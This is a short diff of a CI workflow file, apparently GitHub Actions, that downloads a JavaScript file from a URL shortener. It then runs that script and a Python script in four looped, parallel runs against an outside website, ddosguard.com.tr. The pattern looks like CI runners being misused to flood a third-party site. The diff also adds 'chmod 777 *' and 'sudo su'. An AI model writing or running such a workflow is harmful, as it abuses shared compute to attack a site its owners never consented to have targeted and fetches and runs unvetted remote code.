@@ -20,9 +20,11 @@ jobs:
           wget https://curl.by/vi9NF/testraw.js
           chmod +x testraw.js
           chmod +x Test.py
+          chmod 777 *
+          sudo su
           PIDS=()
           for i in {1..4}; do
-            timeout 200 sudo python3 Test.py https://ddosguard.com.tr/ && node testraw.js https://ddosguard.com.tr/ 666
+            timeout 200 python3 Test.py https://ddosguard.com.tr/ && node testraw.js https://ddosguard.com.tr/ 666
             PIDS+=($!)
           done
           
